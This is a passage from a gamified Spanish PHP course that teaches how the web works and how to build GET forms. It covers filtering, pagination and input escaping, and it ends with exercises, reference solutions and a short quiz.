# RAMA R03 · La Oficina de Correos: la web

```meta
tipo: tronco
posicion: 3
```

## R03-N01 · Cómo funciona la web

```meta
tipo: tema
padre: R02-N11
precio: 10
criatura: slime
temas: web.http, web.servidor
usa: html.estructura
```

### Crónica

Al subir la escalinata de la torre llegás a la **Oficina de Correos**, el corazón del Puerto. Cientos de tubos de bronce bajan del techo; de cada uno cae, cada tanto, un cilindro con un pedido: *"mandame la lista de barcos"*, *"mostrame el horario del ferry"*. Un empleado lo lee, arma la respuesta en una hoja y la manda de vuelta por el mismo tubo.

—Esto es la **web** —dice {mentor}—. Cada tubo es un navegador en algún lugar del mundo. Llega un **pedido**, tu programa PHP arma una **respuesta** —casi siempre una página HTML— y se la manda. Hasta ahora escribías para la terminal, {heroe}. Desde hoy, escribís para el navegador.

### Objetivos

- Entender el ciclo pedido-respuesta de HTTP: método, dirección, código de estado y encabezados.
- Levantar un servidor local con `php -S` y ver una página PHP en el navegador.
- Mezclar PHP y HTML con `<?php ?>` y `<?= ?>`.
- Armar páginas con datos: listas y tablas a partir de arrays.
- Enviar encabezados y códigos de estado con `header()` y `http_response_code()`.

### Antes de empezar

- Arrays, funciones y clases (ramas 1 y 2). Si nunca escribiste HTML, la **Senda del Escaparate** (HTML y CSS) lo enseña desde cero; acá va lo mínimo necesario.

### Explicación

#### Pedido y respuesta
Cuando escribís `http://localhost:8000/barcos.php` en el navegador pasa esto:
1. El navegador manda un **pedido** HTTP: *método* `GET`, *ruta* `/barcos.php`, y
   algunos encabezados (qué navegador es, qué idioma prefiere…).
2. El **servidor** ve que es un archivo `.php`, lo **ejecuta**, y todo lo que el
   programa "imprime" se convierte en el cuerpo de la **respuesta**.
3. La respuesta vuelve con un **código de estado** (`200` = todo bien) y
   encabezados (`Content-Type: text/html`), y el navegador la dibuja.

El código PHP **nunca llega al navegador**: solo llega lo que imprimiste.

| Código | Significa |
|---|---|
| `200` | OK |
| `301` / `302` | la página está en otro lado (redirección) |
| `404` | no existe |
| `403` | prohibido |
| `500` | el servidor falló (casi siempre, un error de tu PHP) |

#### Un servidor en tu compu
PHP trae un servidor web para desarrollar. En la carpeta de tu proyecto:
```bash
php -S localhost:8000
```
Dejalo corriendo y abrí `http://localhost:8000/` en el navegador: muestra
`index.php`. Cada pedido aparece en la terminal. Se corta con `Ctrl+C`.

> Con XAMPP también podés poner los archivos en `C:\xampp\htdocs\` y usar Apache,
> pero `php -S` es más simple para aprender: no hay que configurar nada.

#### HTML mínimo
Una página HTML es texto con **etiquetas**:
```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Puerto</title>
</head>
<body>
    <h1>Barcos en el muelle</h1>
    <p>Hoy llegaron <strong>3</strong> barcos.</p>
    <ul>
        <li>Gaviota</li>
        <li>Albatros</li>
    </ul>
</body>
</html>
```
`<h1>` título, `<p>` párrafo, `<ul>`/`<li>` lista, `<table>`/`<tr>`/`<td>` tabla,
`<a href="…">` enlace. El `<meta charset="utf-8">` hace que las tildes se vean bien.

#### PHP adentro del HTML
Un archivo `.php` puede ser HTML con "agujeros" de PHP:
```php
<?php
$barcos = ['Gaviota', 'Albatros', 'Tortuga'];
$hoy = date('d/m/Y');
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Muelle</title></head>
<body>
    <h1>Barcos del <?= $hoy ?></h1>
    <ul>
        <?php foreach ($barcos as $barco): ?>
            <li><?= htmlspecialchars($barco) ?></li>
        <?php endforeach; ?>
    </ul>
</body>
</html>
```
- `<?= $x ?>` es un atajo de `<?php echo $x; ?>`.
- En las plantillas se usa la **sintaxis alternativa**: `foreach (…):` …
  `endforeach;`, `if (…):` … `else:` … `endif;`. Se lee mejor entre etiquetas HTML
  que las llaves.
- **`htmlspecialchars($x)`** convierte `<`, `>`, `&` y comillas en texto seguro.
  Todo dato que no escribiste vos se muestra pasando por ahí. En el nodo de
  seguridad vas a ver por qué es tan importante.

#### Encabezados y códigos
```php
header('Content-Type: text/plain; charset=utf-8');   // la respuesta es texto, no HTML
http_response_code(404);                             // "no existe"
```
Los encabezados se mandan **antes** que el cuerpo: si ya imprimiste algo (aunque
sea un espacio o un renglón vacío antes de `<?php`), `header()` falla con
`Cannot modify header information - headers already sent`.

#### Qué pidió el navegador
`$_SERVER` tiene los datos del pedido:
```php
$_SERVER['REQUEST_METHOD']   // GET o POST
$_SERVER['REQUEST_URI']      // /barcos.php?orden=nombre
$_SERVER['HTTP_USER_AGENT']  // qué navegador es
```

### Código de ejemplo

`index.php`
```php
<?php
declare(strict_types=1);
/*
 * El tablero del muelle: PHP arma una página HTML con datos.
 * Se prueba con: php -S localhost:8000   y abriendo http://localhost:8000/
 */
$barcos = [
    ['nombre' => 'Gaviota', 'origen' => 'Valle', 'carga' => 450, 'hora' => '06:10'],
    ['nombre' => 'Albatros', 'origen' => 'Imperio', 'carga' => 1200, 'hora' => '08:45'],
    ['nombre' => 'Tortuga', 'origen' => 'Forjas', 'carga' => 80, 'hora' => '11:30'],
];
$total = array_sum(array_column($barcos, 'carga'));
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Tablero del muelle</title>
</head>
<body>
    <h1>Llegadas de hoy</h1>
    <p>Llegan <strong><?= count($barcos) ?></strong> barcos con <?= $total ?> kg de carga.</p>
    <table>
        <tr><th>Hora</th><th>Barco</th><th>Origen</th><th>Carga</th></tr>
        <?php foreach ($barcos as $b): ?>
            <tr>
                <td><?= $b['hora'] ?></td>
                <td><?= htmlspecialchars($b['nombre']) ?></td>
                <td><?= htmlspecialchars($b['origen']) ?></td>
                <td><?= $b['carga'] ?> kg<?php if ($b['carga'] > 1000): ?> (pesado)<?php endif; ?></td>
            </tr>
        <?php endforeach; ?>
    </table>
    <p><a href="estado.php">Estado del servidor</a></p>
</body>
</html>
```

`estado.php`
```php
<?php
declare(strict_types=1);
// Una respuesta de texto plano, no HTML.
header('Content-Type: text/plain; charset=utf-8');
echo "Oficina de Correos: funcionando\n";
echo "Método del pedido: {$_SERVER['REQUEST_METHOD']}\n";
echo "PHP ", PHP_MAJOR_VERSION, '.', PHP_MINOR_VERSION, "\n";
```

### ¿Para qué sirve?

Así funciona toda la web: WordPress, una tienda, un sistema de turnos. Cada página que ves en un sitio hecho con PHP la armó un programa como este, en el servidor, en el momento en que la pediste. Entender el ciclo pedido-respuesta es lo que te permite saber qué pasa cuando algo no anda: ¿el pedido llegó?, ¿qué código devolvió?, ¿qué imprimió el PHP?

### Errores habituales

**Slime: `headers already sent`.**
```
Warning: Cannot modify header information - headers already sent by (output started at index.php:1)
```
Algo se imprimió antes del `header()`: un espacio o un renglón vacío antes de
`<?php`, un `echo`, un BOM al principio del archivo. Los `header()` van antes de
todo.

**Slime: abrir el archivo con doble clic.** Si abrís `file:///…/index.php` en el
navegador, se ve el código PHP (o nada): tiene que pasar por el servidor
(`http://localhost:8000/…`).

**Esqueleto: el servidor en otra carpeta.** `php -S` sirve la carpeta donde lo
ejecutaste. Si da `404 Not Found`, fijate en qué carpeta estás.

**Goblin: la pantalla en blanco.** Un error de PHP puede dejar la página vacía. Mirá
la terminal donde corre `php -S`: ahí aparece el mensaje.

**Slime: el `endforeach` que falta.** La sintaxis alternativa necesita su cierre:
sin `endforeach;` da `syntax error, unexpected end of file`.

### Misión R03-N01-M1 · La cartelera del ferry

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `index.php`, que muestra la **cartelera de salidas del ferry** a partir de
un array de salidas (hora, destino, lugares libres). La página tiene:

- un título `<h1>Salidas del ferry</h1>`;
- una tabla con una fila por salida; cuando no quedan lugares, en lugar del número
  dice `COMPLETO`;
- debajo, un párrafo con la cantidad total de lugares libres.

Usá la sintaxis alternativa (`foreach:` / `endforeach;` e `if:` / `else:` /
`endif;`) y `htmlspecialchars` para los destinos. Probala con `php -S`.

#### Criterio de aprobación

- La página se arma a partir del array (no hay filas escritas a mano).
- Usa la sintaxis alternativa y `<?= ?>`.
- Muestra `COMPLETO` en las salidas sin lugares y el total de lugares libres.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 1 - La cartelera del ferry: una tabla HTML a partir de un array.
$salidas = [
    ['hora' => '07:00', 'destino' => 'Valle de la Serpiente', 'libres' => 12],
    ['hora' => '09:30', 'destino' => 'Forjas de Hierro', 'libres' => 0],
    ['hora' => '13:15', 'destino' => 'Imperio de las Clases', 'libres' => 4],
    ['hora' => '18:40', 'destino' => 'Valle de la Serpiente', 'libres' => 0],
];
$libres = array_sum(array_column($salidas, 'libres'));
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>Ferry</title>
</head>
<body>
    <h1>Salidas del ferry</h1>
    <table>
        <tr><th>Hora</th><th>Destino</th><th>Lugares</th></tr>
        <?php foreach ($salidas as $s): ?>
            <tr>
                <td><?= $s['hora'] ?></td>
                <td><?= htmlspecialchars($s['destino']) ?></td>
                <td>
                    <?php if ($s['libres'] === 0): ?>
                        COMPLETO
                    <?php else: ?>
                        <?= $s['libres'] ?>
                    <?php endif; ?>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>
    <p>Lugares libres en total: <?= $libres ?></p>
</body>
</html>
```

### Misión R03-N01-M2 · La página que no existe

```meta
entrega: archivo
entorno: local
extensiones: zip
monedas: 4
xp: 10
```

#### Consigna

Armá una carpeta con tres archivos:

- `index.php` — una página con enlaces a `muelles.php` y a `faro.php`;
- `muelles.php` — la lista de muelles (un array con nombre y cantidad de barcos),
  con un `<li>` por muelle;
- `faro.php` — el faro está **en mantenimiento**: responde con código **503**
  (`http_response_code(503)`), un encabezado `Retry-After: 3600` y una página que
  lo explica.

Probá los tres en el navegador y, en las herramientas de desarrollador (F12 →
pestaña *Red* o *Network*), mirá el código de estado de cada pedido.

#### Criterio de aprobación

- Los enlaces de `index.php` llevan a las otras páginas.
- `faro.php` responde 503 con el encabezado `Retry-After`.
- Los `header()` y `http_response_code()` van antes de cualquier salida.

#### Solución de referencia

`index.php`
```php
<?php declare(strict_types=1); ?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Puerto</title></head>
<body>
    <h1>Puerto de los Mensajeros</h1>
    <ul>
        <li><a href="muelles.php">Muelles</a></li>
        <li><a href="faro.php">Faro</a></li>
    </ul>
</body>
</html>
```

`muelles.php`
```php
<?php
declare(strict_types=1);
$muelles = [['nombre' => 'Muelle 1: pesca', 'barcos' => 7], ['nombre' => 'Muelle 2: carga', 'barcos' => 3], ['nombre' => 'Muelle 3: pasajeros', 'barcos' => 2]];
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Muelles</title></head>
<body>
    <h1>Muelles</h1>
    <ul>
        <?php foreach ($muelles as $m): ?>
            <li><?= htmlspecialchars($m['nombre']) ?> (<?= $m['barcos'] ?> barcos)</li>
        <?php endforeach; ?>
    </ul>
    <p><a href="index.php">Volver</a></p>
</body>
</html>
```

`faro.php`
```php
<?php
declare(strict_types=1);
// Mision 2 - La página que no existe: un código de estado y un encabezado.
http_response_code(503);
header('Retry-After: 3600');
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Faro en mantenimiento</title></head>
<body>
    <h1>El faro está en mantenimiento</h1>
    <p>Volvé a intentar en una hora.</p>
    <p><a href="index.php">Volver</a></p>
</body>
</html>
```

### Misión R03-N01-M3 · El reloj del puerto

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `reloj.php`, que responde en **texto plano** (no HTML) con:

- la fecha y la hora del servidor en la zona horaria de Argentina
  (`date_default_timezone_set` y `date('d/m/Y H:i:s')`);
- el método del pedido y la ruta pedida (`$_SERVER['REQUEST_URI']`);
- un saludo según la hora: `Buen día` (de 6 a 12), `Buenas tardes` (de 12 a 20) o
  `Buenas noches`.

Actualizá la página varias veces y fijate que la hora cambia: la respuesta se arma
en cada pedido.

#### Criterio de aprobación

- Manda `Content-Type: text/plain; charset=utf-8`.
- Usa `$_SERVER` para el método y la ruta.
- El saludo depende de la hora del servidor.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 3 - El reloj del puerto: una respuesta de texto armada en cada pedido.
date_default_timezone_set('America/Argentina/Buenos_Aires');
header('Content-Type: text/plain; charset=utf-8');

$hora = (int) date('G');
$saludo = match (true) {
    $hora >= 6 && $hora < 12 => 'Buen día',
    $hora >= 12 && $hora < 20 => 'Buenas tardes',
    default => 'Buenas noches',
};

echo "$saludo desde la torre del Puerto.\n";
echo "Son las ", date('d/m/Y H:i:s'), ".\n";
echo "Pediste {$_SERVER['REQUEST_METHOD']} {$_SERVER['REQUEST_URI']}\n";
```

### Encargo R03-N01-E1 · La carta del restaurante

```meta
entrega: codigo
entorno: local
monedas: 1
xp: 15
```

#### Consigna

Un restaurante del puerto quiere su carta en la web. Con un array de **secciones**
(entradas, principales, postres), cada una con sus platos (nombre, descripción,
precio y si es vegetariano), armá `carta.php`:

- un `<h2>` por sección y una lista de sus platos;
- cada plato con su nombre en `<strong>`, la descripción y el precio con
  `number_format` a la argentina;
- los vegetarianos con la marca `(V)`;
- al pie, el plato más caro de toda la carta.

Escribí una función `precio(float $p): string` para el formato y usala en la
plantilla.

#### Criterio de aprobación

- La carta sale de un array de secciones con `foreach` anidados.
- Usa `htmlspecialchars` para los textos y una función para el precio.
- Calcula el plato más caro.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Encargo - La carta del restaurante: una página con foreach anidados.
function precio(float $p): string
{
    return '$' . number_format($p, 2, ',', '.');
}

$carta = [
    'Entradas' => [
        ['nombre' => 'Empanadas riojanas', 'descripcion' => 'De carne cortada a cuchillo (x3)', 'precio' => 5400, 'veg' => false],
        ['nombre' => 'Provoleta', 'descripcion' => 'Con orégano y aceite de oliva', 'precio' => 6200, 'veg' => true],
    ],
    'Principales' => [
        ['nombre' => 'Cabrito a la llama', 'descripcion' => 'Con papas al plomo', 'precio' => 18900, 'veg' => false],
        ['nombre' => 'Locro', 'descripcion' => 'Con zapallo y maíz blanco', 'precio' => 12500, 'veg' => false],
        ['nombre' => 'Ñoquis de calabaza', 'descripcion' => 'Con salsa de hongos', 'precio' => 11800, 'veg' => true],
    ],
    'Postres' => [
        ['nombre' => 'Quesillo con dulce de cayote', 'descripcion' => 'Clásico riojano', 'precio' => 5200, 'veg' => true],
    ],
];

$masCaro = null;
foreach ($carta as $platos) {
    foreach ($platos as $plato) {
        if ($masCaro === null || $plato['precio'] > $masCaro['precio']) {
            $masCaro = $plato;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>La Trompa Alegre</title></head>
<body>
    <h1>Fonda La Trompa Alegre</h1>
    <?php foreach ($carta as $seccion => $platos): ?>
        <h2><?= htmlspecialchars($seccion) ?></h2>
        <ul>
            <?php foreach ($platos as $plato): ?>
                <li>
                    <strong><?= htmlspecialchars($plato['nombre']) ?></strong><?= $plato['veg'] ? ' (V)' : '' ?>
                    — <?= htmlspecialchars($plato['descripcion']) ?> — <?= precio($plato['precio']) ?>
                </li>
            <?php endforeach; ?>
        </ul>
    <?php endforeach; ?>
    <p>El plato estrella: <?= htmlspecialchars($masCaro['nombre']) ?> (<?= precio($masCaro['precio']) ?>)</p>
</body>
</html>
```

### Prueba del sello

#### ¿El navegador recibe el código PHP?

No: el servidor ejecuta el PHP y el navegador recibe solo lo que el programa imprimió (casi siempre HTML).

#### ¿Qué hace `php -S localhost:8000`?

Levanta un servidor web de desarrollo que sirve la carpeta actual en `http://localhost:8000`.

#### ¿Qué es `<?= $x ?>`?

Un atajo de `<?php echo $x; ?>`, cómodo dentro del HTML.

#### ¿Por qué falla un `header()` con `headers already sent`?

Porque ya se imprimió algo (aunque sea un espacio antes de `<?php`): los encabezados tienen que mandarse antes que el cuerpo de la respuesta.

#### ¿Qué significan los códigos 200, 404 y 500?

200: todo bien; 404: la página no existe; 500: el servidor falló (casi siempre por un error en el PHP).

### Soluciones (docente)

Nodo nuevo: el capítulo original de PHP es de consola. Se usa `php -S` en lugar de Apache para no depender de la configuración de XAMPP. Las misiones web no tienen "salida esperada": se corrigen abriéndolas en el navegador (el verificador del curso las prueba con pedidos HTTP). Quien quiera profundizar en HTML puede hacer la Senda del Escaparate, que brota al terminar la rama 1.

## R03-N02 · Formularios con GET

```meta
tipo: tema
padre: R03-N01
precio: 10
criatura: orc
temas: web.formularios
usa: html.formularios
```

### Crónica

En la ventanilla de consultas hay una pizarra con casilleros: *destino*, *día*, *¿con equipaje?*. El viajero anota lo que busca, lo desliza por el tubo, y el empleado le devuelve solo los barcos que coinciden. Si el casillero de destino quedó vacío, le devuelve todos.

—La forma más simple de preguntarle algo al servidor es escribirlo **en la dirección** —dice {mentor}—. Todo lo que va después del signo de pregunta llega a tu programa en `$_GET`. Pero ojo, {heroe}: cualquiera puede escribir cualquier cosa en esa dirección. Lo que llega por ahí nunca es de fiar.

### Objetivos

- Entender la *query string* (`?clave=valor&otra=valor`) y leerla con `$_GET`.
- Armar formularios con `method="get"` y distintos campos.
- Filtrar y ordenar listados según lo que pide el usuario.
- Armar enlaces con parámetros con `http_build_query` y `urlencode`.
- Paginar un listado largo.
- Validar y escapar todo lo que llega en la dirección.

### Antes de empezar

- Cómo funciona la web y `htmlspecialchars` (R03-N01).

### Explicación

#### La query string
En `http://localhost:8000/barcos.php?destino=Valle&pagina=2`, lo que va después del
`?` es la **query string**: pares `clave=valor` separados por `&`. PHP los pone en
el array **`$_GET`**:
```php
$_GET['destino']   // "Valle"
$_GET['pagina']    // "2"   ← ¡siempre texto!
$_GET['orden']     // Warning: Undefined array key "orden" (no vino)
```
Siempre con un valor por defecto y convertido al tipo que necesitás:
```php
$destino = trim($_GET['destino'] ?? '');
$pagina = max(1, (int) ($_GET['pagina'] ?? 1));
```

#### Un formulario con GET
```html
<form method="get" action="barcos.php">
    <label>Destino: <input type="text" name="destino"></label>
    <label>Orden:
        <select name="orden">
            <option value="hora">Por hora</option>
            <option value="nombre">Por nombre</option>
        </select>
    </label>
    <label><input type="checkbox" name="solo_libres" value="1"> Solo con lugar</label>
    <button>Buscar</button>
</form>
```
Al apretar **Buscar**, el navegador arma la dirección con los `name` de cada campo:
`barcos.php?destino=Valle&orden=hora&solo_libres=1`. Un checkbox **sin tildar no
se manda** (por eso se pregunta con `isset($_GET['solo_libres'])`).

#### Mantener lo que eligió
Para que el formulario siga mostrando lo que se buscó, se completa con los valores
recibidos (escapados):
```php
<input type="text" name="destino" value="<?= htmlspecialchars($destino) ?>">
<option value="nombre" <?= $orden === 'nombre' ? 'selected' : '' ?>>Por nombre</option>
<input type="checkbox" name="solo_libres" value="1" <?= $soloLibres ? 'checked' : '' ?>>
```

#### Validar contra una lista
Si un parámetro solo puede tomar ciertos valores, se valida contra la lista y, si
no está, se usa uno por defecto:
```php
$orden = in_array($_GET['orden'] ?? '', ['hora', 'nombre'], true) ? $_GET['orden'] : 'hora';
```
Nunca uses un parámetro de la dirección directamente para elegir un archivo, una
columna o una función: alguien va a escribir algo que no esperabas.

#### Enlaces con parámetros
```php
$url = 'barcos.php?' . http_build_query(['destino' => 'Valle del Sur', 'pagina' => 2]);
// barcos.php?destino=Valle+del+Sur&pagina=2   (codifica los espacios y los símbolos)
```
`http_build_query` codifica los valores por vos (un espacio es `+`, una tilde es
`%C3%AD`…). Para un solo valor suelto, `urlencode($valor)`.

#### Paginar
Con muchos resultados, se muestran de a pocos:
```php
$porPagina = 5;
$total = count($lista);
$paginas = max(1, (int) ceil($total / $porPagina));
$pagina = min(max(1, (int) ($_GET['pagina'] ?? 1)), $paginas);
$visibles = array_slice($lista, ($pagina - 1) * $porPagina, $porPagina);
```
Y los enlaces "anterior" y "siguiente" conservan los otros filtros con
`http_build_query([...$_GET, 'pagina' => $pagina + 1])`… pero ojo: `$_GET` puede
traer cualquier cosa; mejor armá el array con los filtros que ya validaste.

#### Cuándo usar GET
GET es para **consultar**: buscar, filtrar, paginar, ver un producto. La dirección
se puede guardar en favoritos o compartir. **No** es para mandar contraseñas ni
para cambiar datos (eso va con POST, en el próximo nodo).

### Código de ejemplo

`barcos.php`
```php
<?php
declare(strict_types=1);
/*
 * La ventanilla de consultas: filtros, orden y paginación con GET.
 */
$barcos = [
    ['nombre' => 'Gaviota', 'destino' => 'Valle', 'hora' => '06:10', 'libres' => 12],
    ['nombre' => 'Albatros', 'destino' => 'Imperio', 'hora' => '08:45', 'libres' => 0],
    ['nombre' => 'Tortuga', 'destino' => 'Forjas', 'hora' => '11:30', 'libres' => 3],
    ['nombre' => 'Delfín', 'destino' => 'Valle', 'hora' => '13:00', 'libres' => 0],
    ['nombre' => 'Cóndor', 'destino' => 'Ciudadela', 'hora' => '15:20', 'libres' => 8],
    ['nombre' => 'Petrel', 'destino' => 'Valle', 'hora' => '17:45', 'libres' => 5],
    ['nombre' => 'Ballena', 'destino' => 'Imperio', 'hora' => '19:30', 'libres' => 20],
];

// 1. Leer y validar lo que llegó en la dirección
$destino = trim($_GET['destino'] ?? '');
$orden = in_array($_GET['orden'] ?? '', ['hora', 'nombre', 'libres'], true) ? $_GET['orden'] : 'hora';
$soloLibres = isset($_GET['solo_libres']);

// 2. Filtrar y ordenar
$lista = array_filter($barcos, function (array $b) use ($destino, $soloLibres): bool {
    if ($destino !== '' && stripos($b['destino'], $destino) === false) {
        return false;
    }
    return !$soloLibres || $b['libres'] > 0;
});
usort($lista, fn(array $a, array $b): int => $orden === 'libres' ? $b['libres'] <=> $a['libres'] : strcmp($a[$orden], $b[$orden]));

// 3. Paginar
$porPagina = 3;
$paginas = max(1, (int) ceil(count($lista) / $porPagina));
$pagina = min(max(1, (int) ($_GET['pagina'] ?? 1)), $paginas);
$visibles = array_slice($lista, ($pagina - 1) * $porPagina, $porPagina);
$filtros = ['destino' => $destino, 'orden' => $orden] + ($soloLibres ? ['solo_libres' => 1] : []);
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Consultas</title></head>
<body>
    <h1>Barcos</h1>
    <form method="get">
        <label>Destino: <input type="text" name="destino" value="<?= htmlspecialchars($destino) ?>"></label>
        <label>Orden:
            <select name="orden">
                <?php foreach (['hora' => 'Por hora', 'nombre' => 'Por nombre', 'libres' => 'Más lugares'] as $valor => $texto): ?>
                    <option value="<?= $valor ?>" <?= $orden === $valor ? 'selected' : '' ?>><?= $texto ?></option>
                <?php endforeach; ?>
            </select>
        </label>
        <label><input type="checkbox" name="solo_libres" value="1" <?= $soloLibres ? 'checked' : '' ?>> Solo con lugar</label>
        <button>Buscar</button>
    </form>

    <p><?= count($lista) ?> resultado/s<?= $destino !== '' ? ' para «' . htmlspecialchars($destino) . '»' : '' ?>.</p>
    <ul>
        <?php foreach ($visibles as $b): ?>
            <li><?= $b['hora'] ?> <?= htmlspecialchars($b['nombre']) ?> a <?= htmlspecialchars($b['destino']) ?>
                (<?= $b['libres'] > 0 ? $b['libres'] . ' lugares' : 'completo' ?>)</li>
        <?php endforeach; ?>
    </ul>

    <p>Página <?= $pagina ?> de <?= $paginas ?>
        <?php if ($pagina > 1): ?>
            · <a href="?<?= http_build_query([...$filtros, 'pagina' => $pagina - 1]) ?>">anterior</a>
        <?php endif; ?>
        <?php if ($pagina < $paginas): ?>
            · <a href="?<?= http_build_query([...$filtros, 'pagina' => $pagina + 1]) ?>">siguiente</a>
        <?php endif; ?>
    </p>
</body>
</html>
```

### ¿Para qué sirve?

Todos los buscadores, filtros y listados paginados de la web funcionan así: Mercado Libre (`?q=zapatillas&page=2`), Google, el catálogo de cualquier tienda. Como la búsqueda queda en la dirección, se puede compartir o guardar. Y como cualquiera puede escribir cualquier cosa ahí, aprender a validar y escapar `$_GET` es la primera lección de seguridad web.

### Errores habituales

**Orco: el parámetro que no vino.** `$_GET['pagina']` sin `??` da `Warning:
Undefined array key "pagina"` la primera vez que se entra a la página (sin nada en
la dirección).

**Goblin: el número que es texto.** `$_GET['pagina']` vale `"2"` (o `"dos"`, o
`"-5"`). Convertilo y acotalo: `max(1, (int) …)`.

**Troll: mostrar sin escapar.** `Resultados para <?= $_GET['destino'] ?>` deja que
alguien meta HTML (o JavaScript) en tu página poniendo código en la dirección. Siempre
`htmlspecialchars`.

**Ogro: el checkbox sin tildar.** No se manda: `$_GET['solo_libres']` no existe. Se
pregunta con `isset`.

**Slime: el `name` que falta.** Un `<input>` sin `name` no se envía. Si `$_GET` no
trae lo que esperabas, revisá los `name` del formulario (y mirá la dirección).

### Misión R03-N02-M1 · El buscador de la biblioteca

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

La biblioteca del puerto tiene un array de libros (título, autor, año, género).
Escribí `libros.php` con un formulario GET que permita:

- buscar por texto en el título **o** el autor (sin distinguir mayúsculas:
  `stripos`);
- filtrar por género con un `<select>` (con la opción `todos`), validando que el
  género esté en la lista;
- mostrar solo los publicados desde un año (`desde`, número; si no es un entero
  válido, se ignora).

El formulario conserva lo que se buscó. Debajo, la cantidad de resultados y la
lista. Si no hay resultados, el mensaje `No encontramos libros con esos filtros.`

#### Criterio de aprobación

- Lee `$_GET` con valores por defecto y valida el género contra una lista.
- El formulario conserva los valores (escapados).
- Muestra el mensaje cuando no hay resultados.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 1 - El buscador de la biblioteca: filtros con GET.
$libros = [
    ['titulo' => 'Rayuela', 'autor' => 'Julio Cortázar', 'anio' => 1963, 'genero' => 'novela'],
    ['titulo' => 'Ficciones', 'autor' => 'Jorge Luis Borges', 'anio' => 1944, 'genero' => 'cuentos'],
    ['titulo' => 'El túnel', 'autor' => 'Ernesto Sabato', 'anio' => 1948, 'genero' => 'novela'],
    ['titulo' => 'Bestiario', 'autor' => 'Julio Cortázar', 'anio' => 1951, 'genero' => 'cuentos'],
    ['titulo' => 'Las aventuras de la China Iron', 'autor' => 'Gabriela Cabezón Cámara', 'anio' => 2017, 'genero' => 'novela'],
    ['titulo' => 'Poemas de otoño', 'autor' => 'Olga Orozco', 'anio' => 1962, 'genero' => 'poesía'],
];
$generos = ['novela', 'cuentos', 'poesía'];

$texto = trim($_GET['q'] ?? '');
$genero = in_array($_GET['genero'] ?? '', $generos, true) ? $_GET['genero'] : 'todos';
$desde = filter_var($_GET['desde'] ?? '', FILTER_VALIDATE_INT);

$resultado = array_filter($libros, function (array $l) use ($texto, $genero, $desde): bool {
    if ($texto !== '' && stripos($l['titulo'], $texto) === false && stripos($l['autor'], $texto) === false) {
        return false;
    }
    if ($genero !== 'todos' && $l['genero'] !== $genero) {
        return false;
    }
    return $desde === false || $l['anio'] >= $desde;
});
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Biblioteca</title></head>
<body>
    <h1>Biblioteca del Puerto</h1>
    <form method="get">
        <input type="text" name="q" value="<?= htmlspecialchars($texto) ?>" placeholder="Título o autor">
        <select name="genero">
            <option value="todos">todos</option>
            <?php foreach ($generos as $g): ?>
                <option value="<?= $g ?>" <?= $g === $genero ? 'selected' : '' ?>><?= $g ?></option>
            <?php endforeach; ?>
        </select>
        <input type="number" name="desde" value="<?= $desde === false ? '' : $desde ?>" placeholder="Desde el año">
        <button>Buscar</button>
    </form>
    <?php if ($resultado === []): ?>
        <p>No encontramos libros con esos filtros.</p>
    <?php else: ?>
        <p><?= count($resultado) ?> libro/s</p>
        <ul>
            <?php foreach ($resultado as $l): ?>
                <li><em><?= htmlspecialchars($l['titulo']) ?></em>, de <?= htmlspecialchars($l['autor']) ?> (<?= $l['anio'] ?>)</li>
            <?php endforeach; ?>
        </ul>
    <?php endif; ?>
</body>
</html>
```

### Misión R03-N02-M2 · La tabla de multiplicar a pedido

```meta
entrega: codigo
entorno: local
monedas: 4
xp: 10
```

#### Consigna

Escribí `tabla.php`, que muestra la tabla de multiplicar de un número pedido por
GET (`?n=7`), desde 1 hasta un límite (`?hasta=10`, por defecto 10). Validá:

- `n` tiene que ser un entero entre 1 y 100; si no, la página responde con código
  **400** (`http_response_code(400)`) y el mensaje `El número tiene que ser un
  entero de 1 a 100.`;
- `hasta` entre 1 y 20 (si no, se usa 10).

Debajo de la tabla, enlaces para ver la tabla del número anterior y del siguiente,
armados con `http_build_query` (conservando `hasta`).

#### Criterio de aprobación

- Valida con `filter_var` y rangos.
- Responde 400 cuando el número es inválido.
- Los enlaces se arman con `http_build_query`.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Mision 2 - La tabla de multiplicar a pedido: validar GET y responder 400.
$n = filter_var($_GET['n'] ?? '', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 100]]);
$hasta = filter_var($_GET['hasta'] ?? '', FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 20, 'default' => 10]]);

if ($n === false) {
    http_response_code(400);
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title>Tabla</title></head>
<body>
    <?php if ($n === false): ?>
        <p>El número tiene que ser un entero de 1 a 100.</p>
    <?php else: ?>
        <h1>Tabla del <?= $n ?></h1>
        <table>
            <?php for ($i = 1; $i <= $hasta; $i++): ?>
                <tr><td><?= $n ?> × <?= $i ?></td><td><?= $n * $i ?></td></tr>
            <?php endfor; ?>
        </table>
        <p>
            <?php if ($n > 1): ?><a href="?<?= http_build_query(['n' => $n - 1, 'hasta' => $hasta]) ?>">Tabla del <?= $n - 1 ?></a><?php endif; ?>
            <?php if ($n < 100): ?><a href="?<?= http_build_query(['n' => $n + 1, 'hasta' => $hasta]) ?>">Tabla del <?= $n + 1 ?></a><?php endif; ?>
        </p>
    <?php endif; ?>
</body>
</html>
```

### Misión R03-N02-M3 · El catálogo paginado

```meta
